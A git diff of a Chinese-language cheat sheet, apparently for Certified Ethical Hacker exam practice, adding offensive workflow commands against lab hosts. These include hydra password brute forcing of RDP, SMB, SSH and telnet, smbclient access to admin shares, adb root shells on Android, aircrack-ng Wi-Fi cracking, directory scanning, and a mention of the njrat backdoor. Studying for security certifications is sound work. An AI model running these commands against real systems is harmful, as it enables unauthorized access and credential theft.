@@ -8,6 +8,7 @@
 - [git](https://git-scm.com/downloads/win)
 - [vscode](https://code.visualstudio.com/)
 - [hexConvert](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
+- [hash](https://hashes.com/en/decrypt/hash)
 
 ## linux
 ```bash
@@ -50,7 +51,7 @@ net user cehp
 
 
 ## 常用服務和Port
-
+- 21: FTP
 - 22: SSH(Secure Shell)，用於安全遠程登錄。
 - 23: Telnet，非加密的遠程登錄服務。
 - 25: SMTP(Simple Mail Transfer Protocol)，用於傳輸電子郵件。
@@ -205,7 +206,7 @@ aircrack-ng WPA2crack-01.cap -w /usr/share/wordlists/nmap.lst # KEY FOUND! [ 98:
 藏文字於文字檔
 ```powershell
 SNOW.EXE -C -p ceh -m "hello 123" a.txt b.txt
-SNOW.EXE -C -p ceh  b.txt
+SNOW.EXE -C -p ceh b.txt
 ```
 
 
@@ -260,63 +261,92 @@ ip.src == 192.168.1.1 && tcp.port == 1883
 7. 過濾傳輸協議（TCP/UDP）和某些標頭（如 SYN、FIN）
 TCP SYN 標誌（用於建立連接）：
 
-plaintext
-複製程式碼
 tcp.flags.syn == 1 && tcp.flags.fin == 0
-TCP FIN 標誌（用於結束連接）：
-
-plaintext
-複製程式碼
 tcp.flags.fin == 1
-TCP RST 標誌（用於重置連接）：
-
-plaintext
-複製程式碼
 tcp.flags.reset == 1
-TCP ACK 標誌（確認包）：
-
-plaintext
-複製程式碼
 tcp.flags.ack == 1
-8. 過濾端口範圍
-過濾源端口範圍：
 
-plaintext
-複製程式碼
-過濾目的端口範圍：
 
-plaintext
-複製程式碼
-常見的組合範例：
-過濾來源 IP 是 192.168.1.1 且目的 IP 是 192.168.1.2 的所有 TCP 流量：
 
-plaintext
-複製程式碼
-過濾來源 IP 是 192.168.1.1 且使用 HTTP 協議的流量：
-
-plaintext
-複製程式碼
-過濾目的端口是 443（HTTPS）的所有流量：
-
-plaintext
-複製程式碼
-過濾特定源 IP 和端口，並使用 MQTT 協議（端口 1883）：
-
-plaintext
-複製程式碼
-高級過濾：利用位址和協議組合
-Wireshark 允許使用更複雜的過濾器來結合多個條件，以下是一些高級範例：
-
-過濾來自 192.168.1.1 且目的端口為 80 的 HTTP 流量：
-
-plaintext
-複製程式碼
-過濾來自某個 IP 且使用 SSL/TLS（加密）協議的流量：
-
-plaintext
-複製程式碼
-過濾來自某個 IP 且使用 MQTT 並且端口為 1883 的流量：
-
-plaintext
-複製程式碼
+urlencoded-form
 ```
+
+
+
+
+
+
+# 常用工具
+- OpenVAS: 弱掃 gvm-start
+- OpenStego: 圖藏訊息
+- SNOW: 文字檔藏文字
+- HashCalc: 編碼常用
+- PEiD: windows
+- exiftool: linux. `exiftool abc.exe`
+- [DIE](https://github.com/horsicq/DIE-engine/releases): 看PE
+- njrat: 後門
+- Cryptography: .cfe
+- dirsearch: `dirsearch -u http://192.168.44.64` 掃目錄
+
+
+
+
+## 流程
+
+
+```bash
+nmap -sn 10.10.10.* #先掃主機記一下
+
+nmap -O -Pn -p88,389,3268 --open 10.10.10.0/24 # 掃AD domain controller
+
+nmap -A 10.10.10.16 # 找domain controller的product, FQDN
+
+nmap -sV 10.10.10.0/24 | grep "Mercury" # 掃Mercury
+
+nmap 10.10.10.0/24 -p3389 -sVC # 掃RDP
+hydra -l user -P password.txt rdp://10.10.10.16 # hydra -l user -P ~/Desktop/password.txt rdp://10.10.10.16
+
+nmap -p139,445 --open 10.10.10.0/24 # 掃smb
+hydra -L users.txt -P password.txt smb://10.10.10.16
+smbclient -L 10.10.10.16 -U Administrator # 列目錄
+smbclient //10.10.10.16/C$ -U Administrator # 連線
+smb: \> get abc.txt # 抓檔案
+
+
+
+sudo nmap 10.10.1.14 -p5555
+sudo apt install -y adb
+adb connect 10.10.1.14:5555
+adb devices
+adb root
+adb shell
+find / -name Netnormal.txt 2>/dev/null
+adb pull /mydata/Capture.png ./Capture.png
+
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4
+hydra -l username -P password_list.txt telnet://target_ip -t 4
+
+aircrack-ng WEPcrack-01.cap
+aircrack-ng -w password.txt
+aircrack-ng WPA2crack-01.cap  -w /usr/share/wordlists/nmap.lst
+aircrack-ng -w ~/password.txt
+```
+
+
+
+
+
+
+## Modbus
+[Modbus封包](https://github.com/ITI/ICS-Security-Tools/raw/refs/heads/master/pcaps/bro/modbus/modbusSmall.pcap)
+
+
+## dirsearch
+```bash
+git clone https://github.com/maurosoria/dirsearch.git --depth 1 #depth 1僅下載最近的一次提交
+pip3 install -r requirements.txt
+python3 dirsearch.py -u http://10.10.1.19/moviescope
+```
+
+
+
